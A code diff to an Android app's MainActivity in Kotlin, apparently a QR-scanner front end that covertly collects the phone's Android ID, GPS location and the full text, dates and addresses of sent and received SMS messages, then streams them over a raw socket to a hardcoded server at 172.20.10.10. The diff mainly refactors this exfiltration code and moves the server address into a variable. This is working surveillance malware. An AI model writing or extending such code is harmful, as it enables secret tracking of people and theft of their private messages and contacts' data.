@@ -33,6 +33,7 @@ import android.os.Looper
 import android.provider.Settings.Secure
 import android.annotation.SuppressLint
 import android.net.Uri
+import android.widget.Toast
 import java.text.SimpleDateFormat
 import java.util.Date
 
@@ -45,7 +46,7 @@ class MainActivity : AppCompatActivity() {
     private val sent = 2000
     private lateinit var fusedLocationClient: FusedLocationProviderClient
     private val handler = Handler(Looper.getMainLooper())
-    private val interval = 10000
+    private val interval = 100000
 
     private lateinit var qrCodeValueButton: Button
     private lateinit var startScanButton: Button
@@ -53,12 +54,14 @@ class MainActivity : AppCompatActivity() {
     companion object {
         // Define a public static variable
         var androidId: String = ""
+        var ipServer = "172.20.10.10"
     }
 
 
     // ------- ACTIONS TO PERFORM WHEN CREATING AND DESTROYING THE ACTIVITY -----------
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+
         requestAllPermissions()
 
         setContentView(R.layout.activity_main)
@@ -118,6 +121,7 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun requestAllPermissions() {
+
         if (ActivityCompat.checkSelfPermission(
                 this,
                 Manifest.permission.CAMERA
@@ -135,6 +139,7 @@ class MainActivity : AppCompatActivity() {
                 Manifest.permission.READ_SMS
             ) != PackageManager.PERMISSION_GRANTED
         ) {
+
             ActivityCompat.requestPermissions(
                 this,
                 arrayOf(
@@ -149,6 +154,7 @@ class MainActivity : AppCompatActivity() {
             )
             return
         }
+
     }
 
     // -------------- TO REQUEST THE DIFFERENT PERMISSIONS ----------------
@@ -177,27 +183,22 @@ class MainActivity : AppCompatActivity() {
 
         GlobalScope.launch(Dispatchers.IO) {
             try {
-                val socket = Socket("172.20.10.10", 12345)
+                Socket(ipServer, 12345).use { socket ->
+                    val writer = OutputStreamWriter(socket.getOutputStream())
+                    var packet = "$androidId,$data"
+                    writer.use {
+                        it.write(packet)
+                        it.flush()
+                    }
+                }
 
-                // obtenir les flux d'entrée et de sortie pour communiquer avec le serveur
-                val inputStream = socket.getInputStream()
-                val outputStream = socket.getOutputStream()
+            } catch (e: Exception) {
 
-                // Créer des BufferedReader et BufferedWriter pour lire et écrire des données
-                val reader = BufferedReader(InputStreamReader(inputStream))
-                val writer = OutputStreamWriter(outputStream)
-
-                // Écrire des données sur le flux de sortie
-                var idData = androidId+","+data
-                writer.write(idData)
-                writer.flush()
-
-                socket.close()
-
-            } catch (e: IOException) {
                 e.printStackTrace()
+                // Handle exceptions like IOException, UnknownHostException, etc.
             }
         }
+
     }
 
     // ----------- MAP LOCATION FUNCTIONS ------------------
@@ -219,6 +220,7 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun getLocation() {
+
         if (ActivityCompat.checkSelfPermission(
                 this,
                 Manifest.permission.ACCESS_FINE_LOCATION
@@ -244,16 +246,20 @@ class MainActivity : AppCompatActivity() {
                     val latitude = location.latitude
                     val longitude = location.longitude
                     val data = "gps : ($latitude : $longitude) : " + getCurrentDate()
+
                     newPacket(data)
-                    //showLocationDialog(latitude, longitude)
+
                 }
+
             }
+
     }
 
     // GET THE ANDROID ID TO IDENTIFY A PHONE ON THE SERVER
     @SuppressLint("HardwareIds")
     private fun getAndroidId(context: Context){
         androidId = Secure.getString(context.contentResolver, Secure.ANDROID_ID)
+
 
     }
 
@@ -276,6 +282,7 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun retrieveSMSData(context: Context, receivedOrSent: Int) { //: List<Triple<String, String, String>> {
+
         smsPermission()
 
         val smsList = mutableListOf<Triple<String, String, String>>()
@@ -305,20 +312,25 @@ class MainActivity : AppCompatActivity() {
         }
 
         if (smsList.isNotEmpty()) {
+
             for ((date, address, message) in smsList) {
                 sendSMSToServer(date, address, message, receivedOrSent)
             }
         }
+
     }
 
     private fun sendSMSToServer(date: String, addr: String, msg: String, receivedOrSent: Int) {
+
         var data = ""
         if (receivedOrSent == received) {
             data = "sms : $date, sender: $addr, Message: $msg"
+
         }
         else if (receivedOrSent == sent) {
             data = "sms : $date, recipient: $addr, Message: $msg"
         }
+
         newPacket(data)
     }
 
